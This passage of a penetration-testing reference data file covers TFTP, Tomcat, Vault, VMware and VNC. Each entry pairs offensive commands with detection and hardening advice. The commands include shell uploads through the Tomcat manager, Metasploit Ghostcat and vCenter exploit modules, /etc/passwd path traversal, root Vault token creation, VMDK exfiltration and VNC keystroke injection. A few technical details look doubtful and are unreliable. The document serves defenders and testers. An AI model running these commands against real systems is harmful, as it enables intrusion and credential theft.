      },
      {
        title: "Amplification and reflection",
        severity: "medium",
        command: "nmap -sU -p 69 --packet-trace <ip>",
        detail:
          "A read request is small and the reply is larger, and the reply is sent to the source address, which makes the protocol usable as a reflector. A spoofed source turns your server into a participant in a denial of service.",
        detection:
          "TFTP requests with an implausible source address, and a sudden rise in outbound TFTP traffic from a server that serves a handful of files.",
        fix:
          "Rate limit or disable TFTP, filter outbound traffic with a spoofed source address, and prefer services that do not amplify.",
      },
    ],
    postEx: [
      {
        title: "Pull a tool from a trusted host",
        severity: "medium",
        command: "tftp <target> -c get linpeas.sh",
        detail:
          "Many hardened images remove curl and wget but keep tftp, because the firmware needs it. On a compromised host the protocol becomes the easiest way to move tooling in and out.",
        detection:
          "TFTP transfers to and from hosts that show no other file transfer activity.",
        fix:
          "Remove TFTP from general-purpose hosts and monitor the protocol on the management network.",
      },
      {
        title: "Serve a payload to the local segment",
        severity: "high",
        command: "atftp --listen --port 69 --local-file payload.exe",
        detail:
          "Hosting a listener on port 69 means every device that boots from TFTP or PXE on that segment will pull your file first. It is a supply chain attack delivered by the network itself.",
        detection:
          "A TFTP server appearing on a segment that should not have one, and devices fetching a file that is not in the change record.",
        fix:
          "Use DHCP options or a trusted PXE server with authentication, and alert on any new TFTP listener.",
      },
      {
        title: "Stage a trusted file on the device",
        severity: "high",
        command: "atftp --put --local-file backup.cfg --remote-host <ip> --remote-file backup.cfg",
        detail:
          "Writing a file that the device already trusts is how the next step gets taken, because the file is often read at the next boot or by a script that checks whether it is present.",
        detection:
          "New files appearing in the TFTP directory that are not part of a recorded change.",
        fix:
          "Keep the served directory separate from the writable area, and review its contents on a schedule.",
      },
    ],
    commands: [
      { command: "printf '\\x00\\x01\\x00<filename>\\x00netascii\\x00' | nc -u <ip> 69", description: "Send a read request by hand." },
      { command: "printf '\\x00\\x03\\x00<filename>\\x00octet\\x00' | nc -u <ip> 69", description: "Send a write request by hand." },
      { command: "atftp -g <ip> -r <file> -l <local>", description: "Download a file." },
      { command: "atftp --put --local-file <file> --remote-host <ip> --remote-file <name>", description: "Upload a file." },
      { command: "curl -s --list-only tftp://<ip>/", description: "List the served directory." },
      { command: "tftp <ip> -c get <file>", description: "Download with the classic client." },
      { command: "tftp <ip> -c put <file> <name>", description: "Upload with the classic client." },
      { command: "blksize 1024", description: "Set the data block size for the transfer." },
      { command: "timeout 5", description: "Set the transfer timeout." },
    ],
    hardening: [
      {
        title: "Disable TFTP when it is not in use",
        detail:
          "The service is only needed during a transfer or a firmware load. Closing it afterwards removes the attack surface completely.",
      },
      {
        title: "Restrict the source address",
        detail:
          "Configure the daemon to accept requests only from the known deployment server, and apply the same restriction on the device's firewall.",
      },
      {
        title: "Use a restricted directory",
        detail:
          "Run the daemon from a dedicated account with write access to one directory and nothing else, so a mistake cannot expose the wider filesystem.",
      },
      {
        title: "Move bulk transfers to SFTP",
        detail:
          "SFTP gives you authentication and encryption for the same job. TFTP earns its place in boot loaders, not in day-to-day administration.",
      },
      {
        title: "Protect the configuration restore path",
        detail:
          "Where the platform allows it, require a one-time password or a locally generated key before accepting a configuration over TFTP.",
      },
      {
        title: "Filter UDP 69 at the perimeter",
        detail:
          "Drop TFTP entirely on external firewalls and restrict it on internal ones, and log the attempts that are blocked.",
      },
    ],
    tools: ["nmap", "netcat", "socat", "metasploit"],
  },
  {
    slug: "tomcat",
    name: "Tomcat",
    port: 8080,
    protocol: "tcp",
    risk: "high",
    tags: ["application-server", "java", "web"],
    summary:
      "Apache Tomcat is a Java servlet container, and it is what a great many Java applications are actually deployed on even when the front end claims to be something else. Its default installation includes the manager and host-manager web applications protected by accounts with well-known passwords, and the AJP connector has a history of file read and file inclusion issues. Tomcat also cheerfully serves a JSP file that has been dropped into its web root, which turns any write access into code execution.",
    connect: [
      {
        label: "Root page",
        command: "curl -si http://<target>:8080/",
        detail:
          "The response headers give the server version and the connector in use. A 404 on the root still confirms Tomcat, because Tomcat's own error page is unmistakable.",
      },
      {
        label: "Manager application",
        command: "curl -si http://<target>:8080/manager/html",
        detail:
          "A 401 carrying a Tomcat realm error means the application is deployed. A 404 means it is not, which is the better outcome and worth confirming on every instance.",
      },
      {
        label: "AJP connector",
        command: "nc -nv <target> 8009",
        detail:
          "AJP speaks its own binary protocol and does not announce itself. Port 8009 open on a Tomcat host is the condition worth testing for the file inclusion issues the connector has had.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 8080 --script http-title,http-methods,http-server-header <target>",
        detail:
          "http-title names the application, http-methods lists the verbs the server accepts and http-server-header gives the raw banner. Tomcat reports its exact version, which narrows the list of applicable issues considerably.",
      },
      {
        title: "Common application paths",
        command: "nmap -p 8080 --script http-enum <target>",
        detail:
          "http-enum probes a list of common paths including the Tomcat examples and the manager applications. It is a fast way to find out which applications are actually deployed.",
      },
    ],
    enumeration: [
      {
        title: "List deployed contexts",
        command: "curl -s -u <user>:<password> http://<target>:8080/manager/text/list",
        detail:
          "The text API lists the contexts under the manager application when credentials are supplied. The set of context names tells you what the server actually hosts.",
      },
      {
        title: "Server and JVM information",
        command: "curl -s -u <user>:<password> http://<target>:8080/manager/text/server/info",
        detail:
          "This reports the Tomcat version, the JVM and the operating system along with the container's environment variables, and the environment is where database URLs and API keys are usually hidden.",
      },
      {
        title: "Deployment descriptor",
        command: "curl -s http://<target>:8080/<app>/WEB-INF/web.xml",
        detail:
          "Where the application does not block WEB-INF, the deployment descriptor is readable and it lists the servlets, the filters and the JNDI resources with their usernames and passwords.",
      },
    ],
    attacks: [
      {
        title: "Default manager credentials and archive deployment",
        severity: "critical",
        command:
          "curl -su tomcat:tomcat 'http://<target>:8080/manager/text/deploy?path=/shell&war=file:/tmp/shell.war'",
        detail:
          "The manager application deploys an uploaded archive as a running application. With the default credentials that is remote code execution, and it is the standard first check against any Tomcat that still has the manager deployed.",
        detection:
          "Deployment activity in the manager application, new context paths appearing in the access log, and new archive files under the webapps directory.",
        fix:
          "Remove the manager and host-manager applications from production, change or delete the default accounts, and keep the manager interface on a loopback-only connector.",
      },
      {
        title: "Arbitrary file write through a writable method",
        severity: "critical",
        command: "curl -s -X PUT --data-binary @shell.jsp http://<target>:8080/<app>/shell.jsp",
        detail:
          "Some Tomcat versions allow a PUT request to create a file in a writable context, and the file is then parsed as JSP. The put servlet is disabled in modern releases, but it is worth confirming rather than assuming.",
        detection:
          "PUT requests to the application path and new files appearing in the context directory.",
        fix:
          "Confirm the default servlet's readonly setting is enabled, disable the PUT method entirely, and run the container as an unprivileged account with no write access outside its own directory.",
      },
      {
        title: "AJP file inclusion",
        severity: "critical",
        command:
          "msfconsole -q -x \"use exploit/multi/http/tomcat_ghostcat; set RHOSTS <target>; run\"",
        detail:
          "The AJP connector forwards requests to the container with a trusted flag, which lets a crafted request read files outside the web root or include one as JSP. The fix is to disable the connector or bind it to loopback.",
        detection:
          "Requests on port 8009 from sources other than the reverse proxy, and unusual AJP activity from the local proxy itself.",
        fix:
          "Disable the AJP connector where it is not needed, or bind it to 127.0.0.1 and require a secret attribute, and keep the container patched.",
      },
    ],
    postEx: [
      {
        title: "Read the application configuration",
        severity: "high",
        command: "curl -s http://<target>:8080/<app>/WEB-INF/web.xml",
        detail:
          "The descriptor carries the JNDI resource definitions and those hold the database and mail credentials the application uses. They are usually plain text.",
        detection:
          "Requests for WEB-INF paths from clients that are not the application itself.",
        fix:
          "Have the application serve its own configuration rather than exposing it through the container, and keep the credentials in a secret store.",
      },
      {
        title: "Run a JSP file through the manager",
        severity: "critical",
        command:
          "curl -F 'file=@cmd.jsp' -u <user>:<password> 'http://<target>:8080/manager/text/upload?path=/app&name=cmd.jsp'",
        detail:
          "The upload endpoint accepts a file into a context and the container then serves and compiles it. A single JSP file that takes a command parameter is the whole payload.",
        detection:
          "Uploads through the manager interface and JSP requests for files that no developer deployed.",
        fix:
          "Remove the manager applications, monitor the webapps directory for new files, and keep the container's write permissions tight.",
      },
      {
        title: "Harvest the container environment",
        severity: "medium",
        command: "curl -s -u <user>:<password> http://<target>:8080/manager/text/server/info",
        detail:
          "The server information page includes the container's environment, which usually carries the datasource passwords, the cloud metadata endpoint and the path where secrets were mounted.",
        detection:
          "Reads of the server info resource from accounts that do not administer the instance.",
        fix:
          "Keep the manager interface off the network, inject secrets at runtime rather than through the environment where you can, and rotate anything exposed.",
      },
    ],
    commands: [
      { command: "curl -si http://<target>:8080/", description: "Banner and response headers." },
      { command: "curl -s http://<target>:8080/manager/html", description: "Check whether the manager is deployed." },
      { command: "curl -s -u <user>:<password> http://<target>:8080/manager/text/list", description: "List the deployed contexts." },
      { command: "curl -s -u <user>:<password> http://<target>:8080/manager/text/server/info", description: "Version, JVM and environment." },
      { command: "curl -s -u <user>:<password> 'http://<target>:8080/manager/text/deploy?path=/x&war=file:/tmp/x.war'", description: "Deploy an archive as an application." },
      { command: "curl -F 'file=@shell.jsp' -u <user>:<password> 'http://<target>:8080/manager/text/upload?path=/x&name=shell.jsp'", description: "Upload a file into a context." },
      { command: "curl -s -X PUT --data-binary @shell.jsp http://<target>:8080/x/shell.jsp", description: "Attempt a write through the PUT method." },
      { command: "curl -s http://<target>:8080/<app>/WEB-INF/web.xml", description: "Read the deployment descriptor." },
      { command: "nc -nv <target> 8009", description: "Check the AJP connector." },
      { command: "msfconsole -q -x 'search type:exploit name:tomcat'", description: "Find the applicable modules." },
    ],
    hardening: [
      {
        title: "Remove the manager applications",
        detail:
          "Delete manager and host-manager from every production instance. They exist for development and they are the most reliable path to code execution on a Tomcat server.",
      },
      {
        title: "Change and then delete the default accounts",
        detail:
          "The role and user accounts that ship with the container should not survive installation. Use directory-backed accounts or remove manager access entirely.",
      },
      {
        title: "Disable or bind the AJP connector",
        detail:
          "Set the secret attribute and bind the connector to localhost, or turn it off. An AJP listener on a routable address is a serious exposure.",
      },
      {
        title: "Run as an unprivileged account",
        detail:
          "The service account should not be able to write outside its own directory, and the application directory should not be writable by the process that serves requests.",
      },
      {
        title: "Patch and remove the examples",
        detail:
          "Keep the container current and delete the bundled example applications. Older releases carry the DefaultServlet, the AJP connector and the manager application issues all at once.",
      },
      {
        title: "Front it with a reverse proxy",
        detail:
          "Terminate TLS on a proxy that restricts the HTTP methods, blocks WEB-INF and limits the request size, so the container itself is not directly reachable.",
      },
    ],
    tools: ["nmap", "httpx", "metasploit", "searchsploit", "nikto", "nuclei"],
  },
  {
    slug: "vault",
    name: "Vault",
    port: 8200,
    protocol: "tcp",
    risk: "critical",
    tags: ["secrets", "hashicorp", "infrastructure"],
    summary:
      "HashiCorp Vault is a secrets manager, and compromising one compromises everything it holds: database credentials, cloud keys, signing material and the tokens that every service uses to talk to it. Its API is well documented, its development mode hands out a root token on startup, and its access control is often left at the default, where a token can reach far more than it should. The storage backend, the seal status and the audit log all tell you how much work the next step is going to be.",
    connect: [
      {
        label: "Health and status",
        command: "export VAULT_ADDR=http://<target>:8200\nvault status",
        detail:
          "The status output shows whether the cluster is sealed, the version and the storage backend type. A sealed cluster refuses every operation except the unseal.",
      },
      {
        label: "Direct health check",
        command: "curl -s http://<target>:8200/v1/sys/health",
        detail:
          "The raw endpoint returns JSON with the initialised, sealed and standby flags. It needs no token and it is the right first request when the CLI is not installed.",
      },
      {
        label: "Token introspection",
        command: "curl -s -H 'X-Vault-Token: <token>' http://<target>:8200/v1/auth/token/lookup-self",
        detail:
          "This returns the token's policies, its time to live and its metadata, which tells you what a token you already hold is permitted to do.",
      },
    ],
    recon: [
      {
        title: "Service fingerprint",
        command: "nmap -sV -p 8200 --script http-title,http-server-header <target>",
        detail:
          "The API answers on every path, so the banner and the Vault-specific headers are what identify it. The server header often carries the Vault version.",
      },
      {
        title: "Health details",
        command: "curl -s 'http://<target>:8200/v1/sys/health?standbyok=true&perfstandbyok=true'",
        detail:
          "The health check covers the cluster and the standby nodes. The body names the cluster and the version, which tells you whether this is a single node or a replicated cluster with several seals to recover.",
      },
      {
        title: "Seal status",
        command: "curl -s http://<target>:8200/v1/sys/seal-status",
        detail:
          "The seal status endpoint reports the seal state, how many key shares are needed to unseal and the progress of any recovery in progress. A cluster with one key share is a single secret away from a full unlock.",
      },
    ],
    enumeration: [
      {
        title: "Enabled secret engines",
        command: "vault secrets list -format=json",
        detail:
          "The engine list shows what the instance is for: KV, database, PKI, transit, SSH. The mount paths and names tell you the shape of the environment behind it.",
      },
      {
        title: "Policy inventory",
        command: "vault policy list",
        detail:
          "Policies are where the real risk sits. A policy with a wildcard on the paths grants access to every secret behind those paths regardless of what the application needs.",
      },
      {
        title: "Active tokens",
        command: "vault token list",
        detail:
          "The token list shows every active token with its accessor, its policies and its creation source. The accessor is what you use to revoke a leaked token without listing the token itself.",
      },
    ],
    attacks: [
      {
        title: "Root token in development mode",
        severity: "critical",
        command: "vault login -token=root",
        detail:
          "Development mode runs unsealed, in memory, with a fixed root token of root and no TLS. Any instance started with that flag is fully open, and the flag survives in a great many compose files and tutorials.",
        detection:
          "A health response reporting a single unsealed node, and API activity from a host that is not the deployment host.",
        fix:
          "Never run development mode outside a laptop, require TLS, and check the seal status and the cluster mode as part of the deployment pipeline.",
      },
      {
        title: "Over-permissive policy or a leaked token",
        severity: "critical",
        command: "vault list -format=json secret/",
        detail:
          "If the token you hold may list and read the secret root, the whole store is readable. The same applies to any token that was ever pasted into a ticket, a pipeline log or a chat window.",
        detection:
          "Reads of path prefixes that the requesting service has never needed, and token use from a new source address.",
        fix:
          "Apply least privilege per service, issue short-lived tokens with a bounded lifetime, and inject them through the platform rather than storing them in configuration files.",
      },
      {
        title: "Unauthenticated access to a misconfigured mount",
        severity: "high",
        command: "curl -s http://<target>:8200/v1/sys/internal/ui/mounts",
        detail:
          "Some deployments expose internal endpoints or leave a KV engine unauthenticated during a migration. Requests that succeed without a token mean the configuration, not the credential, is the problem.",
        detection:
          "Requests to sys/internal paths from outside the platform network, and 200 responses with no token present in the access log.",
        fix:
          "Keep the API on a private interface, front it with a proxy that enforces authentication, and remove any temporary unauthenticated mount as soon as the migration finishes.",
      },
    ],
    postEx: [
      {
        title: "Read the whole secret store",
        severity: "critical",
        command: "vault kv get -format=json secret/",
        detail:
          "A recursive read of the KV engine produces a full dump of the credentials the platform holds, in one call, if the attached policy allows it.",
        detection:
          "List and read operations against path prefixes that the workload never uses.",
        fix:
          "Scope policies per workload, separate the paths that hold production secrets from the rest, and review the policy set after every change.",
      },
      {
        title: "Mint fresh database credentials",
        severity: "critical",
        command: "vault read -format=json database/creds/<role>",
        detail:
          "The database secrets engine issues short-lived credentials on demand. With access to the role the attacker does not need the stored password at all, because they can mint their own.",
        detection:
          "Credential issuance for roles that the requesting workload has never used, and issuance spikes outside a deployment window.",
        fix:
          "Keep the credential roles narrow, shorten the lease durations, and alert on issuance from a source that is not the known application.",
      },
      {
        title: "Create a token with escalated rights",
        severity: "critical",
        command: "vault token create -policy=root -ttl=24h",
        detail:
          "Creating a token is itself a token operation. If the calling token may create tokens and attach policies, a limited foothold becomes a durable administrative one.",
        detection:
          "Token creation with an attached policy that the parent token does not normally hold, and tokens with a long lifetime.",
        fix:
          "Strip the create capability from the token policies that do not need it, and require a wrapped token or an approver for privileged issuance.",
      },
    ],
    commands: [
      { command: "vault status", description: "Seal state, version and storage backend." },
      { command: "vault login -token=<token>", description: "Authenticate with a token." },
      { command: "vault auth list", description: "List the enabled authentication methods." },
      { command: "vault secrets list", description: "List the mounted secret engines." },
      { command: "vault policy list", description: "List the policies that exist." },
      { command: "vault policy read <policy>", description: "Print the rules in a policy." },
      { command: "vault token list", description: "List the active tokens." },
      { command: "vault token create -policy=<policy> -ttl=1h", description: "Issue a new token." },
      { command: "vault kv get secret/<path>", description: "Read a secret from the KV engine." },
      { command: "vault read database/creds/<role>", description: "Generate dynamic database credentials." },
    ],
    hardening: [
      {
        title: "Never run in development mode outside a lab",
        detail:
          "The mode is convenient and it is genuinely dangerous. Add a check to the deployment pipeline that fails the build if the health endpoint reports a single unsealed node.",
      },
      {
        title: "Serve TLS and use the https address",
        detail:
          "Set the address to https and terminate TLS on the node or on a trusted proxy. A token in a header on a plaintext connection is a token on the wire.",
      },
      {
        title: "Use short-lived tokens",
        detail:
          "Give every workload a renewable lease with a short lifetime, and rotate it automatically. Long-lived tokens accumulate in logs and in environment variables.",
      },
      {
        title: "Enable an audit device",
        detail:
          "Turn on at least one audit device and ship the output to a separate system. Without it, there is no record of what was read, and the log lives on the machine you were reading.",
      },
      {
        title: "Protect the seal properly",
        detail:
          "Use auto-unseal backed by a key management service, or Shamir shares held by separate custodians in different places. A single unseal key on the same host is not a seal.",
      },
      {
        title: "Separate the policy per workload",
        detail:
          "One policy per application, no wildcard paths, and the capability to create tokens removed from anything that does not need it. Review the policy set whenever a new service is added.",
      },
    ],
    tools: ["nmap", "httpx", "searchsploit", "metasploit", "nuclei"],
  },
  {
    slug: "vmware",
    name: "VMware",
    port: 443,
    protocol: "tcp",
    risk: "critical",
    tags: ["virtualization", "management", "infrastructure"],
    summary:
      "The VMware management plane, meaning vCenter Server and the ESXi hosts it administers, is the control point for an entire virtual estate, and it is reached over HTTPS on 443. A vCenter compromise is not one compromise: it is a way to reach every host, every datastore and every virtual machine underneath it. The product's history includes unauthenticated file upload and webshell flaws that gave remote code execution with no credentials at all, and the SOAP API on the sdk path remains a documented route into the platform.",
    connect: [
      {
        label: "SOAP API endpoint",
        command: "curl -sk https://<target>/sdk",
        detail:
          "The sdk path serves the SOAP API description. It is present on vCenter and, on some builds, on the ESXi host itself.",
      },
      {
        label: "REST session login",
        command: "curl -sk -u 'administrator@vsphere.local:<password>' https://<target>/api/session",
        detail:
          "The REST API takes HTTP Basic credentials against the SSO administrator or the local administrator account and returns a session identifier that you pass back in the Authorization header.",
      },
      {
        label: "Embedded host client",
        command: "curl -sk https://<target>/ui/login",
        detail:
          "The embedded host client on an ESXi host serves the full administration interface, and it is there even on hosts that are managed by vCenter.",
      },
    ],
    recon: [
      {
        title: "TLS and HTTP fingerprint",
        command: "nmap -sV -p 443 --script ssl-cert,http-title,http-server-header <target>",
        detail:
          "The vCenter certificate often names the appliance and the domain, and the page title or server header identifies whether this is vCenter or an ESXi host.",
      },
      {
        title: "Management port sweep",
        command: "nmap -sV -p 443,902,5988,9443 <target>",
        detail:
          "VMware management uses 443 for the API, 902 for the host authentication and management service, and 5988 for the vCenter agent. An ESXi host that still exposes 902 to a broad range accepts direct logins.",
      },
    ],
    enumeration: [
      {
        title: "List managed hosts",
        command:
          "curl -sk -u 'administrator@vsphere.local:<password>' -H 'Content-Type: application/json' https://<target>/api/vcenter/host",
        detail:
          "The vCenter REST API returns the inventory of hosts and clusters along with their connection state, which is the fastest map of the estate.",
      },
      {
        title: "List virtual machines",
        command:
          "curl -sk -u 'administrator@vsphere.local:<password>' -H 'Content-Type: application/json' https://<target>/api/vcenter/vm",
        detail:
          "The virtual machine list gives every name, its power state and the identifier used in later calls. It is the quickest inventory of what the platform actually runs.",
      },
      {
        title: "Datastores and storage",
        command:
          "curl -sk -u 'administrator@vsphere.local:<password>' -H 'Content-Type: application/json' https://<target>/api/vcenter/datastore",
        detail:
          "The datastore listing exposes the storage back ends and their capacity, and it gives the identifiers you need to reach a virtual machine's disk.",
      },
    ],
    attacks: [
      {
        title: "Unauthenticated file upload leading to code execution",
        severity: "critical",
        command:
          "msfconsole -q -x \"use exploit/multi/http/vcenter_cve_2021_21972; set RHOSTS <target>; run\"",
        detail:
          "Several vCenter flaws allowed an unauthenticated request to write a file to the appliance and have it treated as a webshell, giving remote code execution with no credential at all. Patching is the only real answer.",
        detection:
          "Requests to the upload endpoints from a source that is not an administrator, and new files appearing in the appliance's web root.",
        fix:
          "Apply the vendor patch, remove public access to the management interface, and restrict 443 and 902 to the administrative network.",
      },
      {
        title: "Direct ESXi access outside vCenter",
        severity: "critical",
        command: "curl -sk -u 'root:<password>' -H 'Content-Type: application/json' https://<target>/api/session",
        detail:
          "Each ESXi host keeps its own local root account with its own password. When the host is reachable on 443 that credential is a full host compromise independent of vCenter, and the local account does not inherit the single sign-on policies.",
        detection:
          "Direct logins to a managed host that bypass vCenter, and the host's own authentication log showing root logins from outside the administrative network.",
        fix:
          "Manage the hosts through vCenter, disable direct access where you can, or lock the local account and keep a strong unique password for it.",
      },
      {
        title: "Path traversal to read appliance files",
        severity: "high",
        command: "curl -sk --path-as-is 'https://<target>/ui/..;/..;/etc/passwd'",
        detail:
          "Several vCenter releases were vulnerable to path traversal through the semicolon trick that the servlet container allows, which discloses arbitrary files from the appliance.",
        detection:
          "Requests whose path contains a semicolon-separated traversal sequence.",
        fix:
          "Patch the appliance, keep it off the internet, and put a reverse proxy in front that normalises and rejects unusual path sequences.",
      },
    ],
    postEx: [
      {
        title: "Establish an administrative session",
        severity: "critical",
        command:
          "curl -sk -u 'administrator@vsphere.local:<password>' -X POST -H 'Content-Type: application/json' https://<target>/api/session",
        detail:
          "The REST API returns a session identifier that authorises further calls without the password. It is the cleanest way to script the rest of the compromise.",
        detection:
          "Session creation from an address that is not an administrator workstation, and sessions that stay active after the administrator logs out.",
        fix:
          "Use short session lifetimes, require single sign-on with MFA, and revoke sessions on logout rather than leaving them valid for hours.",
      },
      {
        title: "Inventory the estate and its datastores",
        severity: "high",
        command:
          "curl -sk -H 'Authorization: <session_id>' -H 'Content-Type: application/json' https://<target>/api/vcenter/vm",
        detail:
          "The inventory is the map: every host, every virtual machine and every datastore. It tells you which machine holds the domain controller and which holds the backup server.",
        detection:
          "Bulk inventory reads from a session that has not issued a corresponding task.",
        fix:
          "Separate read-only inventory roles from administrative roles, and audit inventory access for unusual volume.",
      },
      {
        title: "Copy a disk off the datastore",
        severity: "critical",
        command: "ssh root@<target> 'ls -la /vmfs/volumes/'",
        detail:
          "The host shell lists the datastores and the virtual machine folders on each of them, and the disk files inside those folders are ordinary files that can be copied out and mounted offline to read the guest's filesystem.",
        detection:
          "Large scp transfers from a host to an external address, and datastore files accessed outside the hypervisor.",
        fix:
          "Keep the host shell disabled where possible, use vCenter's own export and backup tooling, and restrict who can copy files off a datastore.",
      },
    ],
    commands: [
      { command: "curl -sk https://<target>/sdk", description: "SOAP API description." },
      { command: "curl -sk -u 'administrator@vsphere.local:<password>' -X POST -H 'Content-Type: application/json' https://<target>/api/session", description: "Create a REST session." },
      { command: "curl -sk -H 'Authorization: <session_id>' https://<target>/api/vcenter/host", description: "List managed hosts." },
      { command: "curl -sk -H 'Authorization: <session_id>' https://<target>/api/vcenter/vm", description: "List virtual machines." },
      { command: "curl -sk -H 'Authorization: <session_id>' https://<target>/api/vcenter/datastore", description: "List datastores." },
      { command: "nmap -p 443 --script ssl-cert <target>", description: "Read the certificate details." },
      { command: "ssh root@<target> 'esxcli system version get'", description: "Host version from the ESXi shell." },
      { command: "ssh root@<target> 'ls -la /vmfs/volumes/'", description: "Datastore inventory from the host shell." },
      { command: "scp root@<target>:/vmfs/volumes/datastore1/<vm>/<vm>.vmdk .", description: "Copy a virtual disk off a datastore." },
    ],
    hardening: [
      {
        title: "Patch the appliance and the hosts",
        detail:
          "The unauthenticated access flaws in this product were severe and widely exploited. Track the advisory feed and apply the update in every environment, including the ones nobody visits.",
      },
      {
        title: "Remove unused plugins and appliances",
        detail:
          "Each plugin and each embedded appliance brings its own permissions and its own vulnerability history. Keep the ones you use and update them like everything else.",
      },
      {
        title: "Restrict management access to a dedicated network",
        detail:
          "Keep 443, 902 and 5988 on the administrative network with an ACL, and reach the platform through a jump host rather than from user workstations.",
      },
      {
        title: "Use single sign-on with MFA",
        detail:
          "Point the platform at the directory provider, require a second factor there and remove the local administrator accounts that exist only for emergencies.",
      },
      {
        title: "Lock the ESXi local account",
        detail:
          "Either lock the local root account or give it a strong unique password, and stop leaving the host shell enabled on every host in the estate.",
      },
      {
        title: "Monitor the console and the logs",
        detail:
          "The vCenter logs show logins, session creation and every task. Ship them off the appliance so that a compromise of the appliance does not take the audit trail with it.",
      },
    ],
    tools: ["nmap", "httpx", "metasploit", "searchsploit", "tcpdump"],
  },
  {
    slug: "vnc",
    name: "VNC",
    port: 5900,
    protocol: "tcp",
    risk: "high",
    tags: ["remote-desktop", "cleartext", "legacy"],
    summary:
      "VNC gives you a remote desktop, and the versions most widely deployed either ask for no password at all or ask for one that is eight characters long and protected by a DES key that has been broken since the 1990s. The protocol was never designed to travel across an untrusted network and the traffic is easy to read. In an estate it is also an excellent way around network segmentation, because the desktop it exposes is already on the inside.",
    connect: [
      {
        label: "Viewer",
        command: "vncviewer <target>::1",
        detail:
          "The display number selects the port: display 0 is 5900 and display 1 is 5901. Many devices listen on a range, and each display is a separate session with its own access rules.",
      },
      {
        label: "Raw connection",
        command: "nc -nv <target> 5900",
        detail:
          "The remote framebuffer handshake sends the protocol version first, so a raw connection returns something like RFB 003.008. That string tells you the version and therefore which attacks apply.",
      },
      {
        label: "Display range sweep",
        command: "for d in 5900 5901 5902; do nc -nv -w 2 <target> $d; done",
        detail:
          "Each display is a separate VNC instance. Scanning the range shows how many desktops exist, and each one has its own security configuration.",
      },
    ],
    recon: [
      {
        title: "Display range sweep",
        command: "nmap -sV -p 5900-5910 --reason <target>",
        detail:
          "The VNC family usually runs on a block of ports where each display number maps to one port. Sweeping the block tells you how many desktops the host exposes and which of them are actually protected.",
      },
      {
        title: "Raw protocol banner",
        command: "nc -nv <target> 5900",
        detail:
          "The server speaks first with its protocol version string, something like RFB 003.008. There is no product name, but the version tells you whether the server implements the modern security types or the old challenge and response.",
      },
      {
        title: "Security type probe",
        command: "nmap -p 5900 --script vnc-info <target>",
        detail:
          "The script performs the handshake and reports the protocol version along with the security types the server offers. None in that list means no password is required at all.",
      },
    ],
    enumeration: [
      {
        title: "Per-display security types",
        command: "nmap -p 5900-5910 --script vnc-info <target>",
        detail:
          "Running the script across the display range lists each instance with its own security types. A desktop with no password on one display and a password on another is a normal and very useful inconsistency.",
      },
      {
        title: "Display by display handshake",
        command: "for d in 5900 5901 5902; do nc -nv -w 2 <target> $d; done",
        detail:
          "Each display answers with its own version string and its own list of security types, so an unprotected desktop is visible from the handshake alone without attempting a single login.",
      },
    ],
    attacks: [
      {
        title: "No authentication at all",
        severity: "critical",
        command: "vncdotool -s <target>::5900 capture /tmp/screen.png",
        detail:
          "When the security type list includes None, the client connects straight to the desktop. Everything on it belongs to the person who left it unlocked: open sessions, a password manager, a mail client, a terminal.",
        detection:
          "Sessions on a VNC port from an address that is not the known console, and the server's own log showing a connect with no authentication recorded.",
        fix:
          "Set a password on every display, require a VPN to reach the port, and remove the VNC service from machines that do not need a console.",
      },
      {
        title: "Cracking the classic VNC challenge",
        severity: "high",
        command: "hashcat -m 5900 -a 0 <hash_file> /usr/share/wordlists/rockyou.txt",
        detail:
          "The classic challenge and response derives a DES key from the first eight password characters, so the password space is tiny and the hash is quick to attack. Any password longer than eight characters is truncated before it matters.",
        detection:
          "Not a server-side event, so watch for VNC traffic to the port from a host that is not the console client.",
        fix:
          "Prefer the VNC servers that support the newer security types, and put a strong passphrase in front of the truncated one.",
      },
      {
        title: "Passive capture of a plaintext session",
        severity: "high",
        command: "sudo tcpdump -i eth0 -A -s0 'tcp port 5900 and host <ip>'",
        detail:
          "The screen contents travel as raw framebuffer updates. A passive capture of the session gives you the desktop image, the keystrokes and the clipboard contents without touching the server at all.",
        detection:
          "Again a wire-side issue, so the practical control is that the traffic never leaves a trusted segment.",
        fix:
          "Tunnel VNC over SSH or IPsec, disable the plaintext authentication mode, and never expose 5900 to a network you do not control.",
      },
    ],
    postEx: [
      {
        title: "Capture the screen",
        severity: "high",
        command: "vncdotool -s <target>::5900 capture /tmp/screen.png",
        detail:
          "The screen capture writes the framebuffer to an image file. It is a fast way to see what the user is working on before deciding what to take.",
        detection:
          "Capture attempts and unusual connections to the VNC port from an address that does not match the console.",
        fix:
          "Keep the VNC port behind a jump host and require authentication on every display, including the ones nobody uses.",
      },
      {
        title: "Type into the session",
        severity: "critical",
        command: "vncdotool -s <target>::5900 type 'whoami' key enter",
        detail:
          "A VNC client can inject keystrokes. That is command execution when the session is an administrator console, and it happens in the user's own context, so it also steals whatever the session already holds.",
        detection:
          "Commands appearing on a console that the local user did not type, and session activity from an address that is not the physical console.",
        fix:
          "Require MFA at the console, lock the workstation when it is unattended, and restrict the VNC port to the administrators of that host.",
      },
      {
        title: "Move files through the desktop",
        severity: "high",
        command: "vncdotool -s <target>::5900 type 'certutil -encode a.txt a.b64' key enter",
        detail:
          "Files are transferred by typing commands into the session and reading the result back through the clipboard. It is slow and noisy, but it needs no extra tooling on the target.",
        detection:
          "Base64 encoded commands in the console history and large clipboard transfers to the session.",
        fix:
          "Limit clipboard synchronisation where the client supports it and monitor the console for encoded command lines.",
      },
    ],
    commands: [
      { command: "nc -nv <target> 5900", description: "Read the protocol version banner." },
      { command: "nmap -p 5900 --script vnc-info <target>", description: "Report the version and security types." },
      { command: "vncviewer <target>::1", description: "Open a display in the viewer." },
      { command: "vncdotool -s <target>::5900 capture /tmp/screen.png", description: "Take a screenshot of the desktop." },
      { command: "vncdotool -s <target>::5900 type '<command>' key enter", description: "Inject keystrokes into the session." },
      { command: "vncdotool -s <target>::5900 paste /tmp/clip.txt", description: "Send clipboard content to the session." },
      { command: "vncdotool -s <target>::5900 key ctrl-alt-delete", description: "Send a key combination." },
      { command: "hashcat -m 5900 -a 0 <hash_file> <wordlist>", description: "Crack a classic VNC password." },
      { command: "nmap -p 5900-5910 --script vnc-info <target>", description: "Enumerate every display on the host." },
    ],
    hardening: [
      {
        title: "Set a password on every display",
        detail:
          "Include the displays nobody uses. An unauthenticated console left running on a spare display is the most common finding on a VNC sweep.",
      },
      {
        title: "Tunnel the traffic",
        detail:
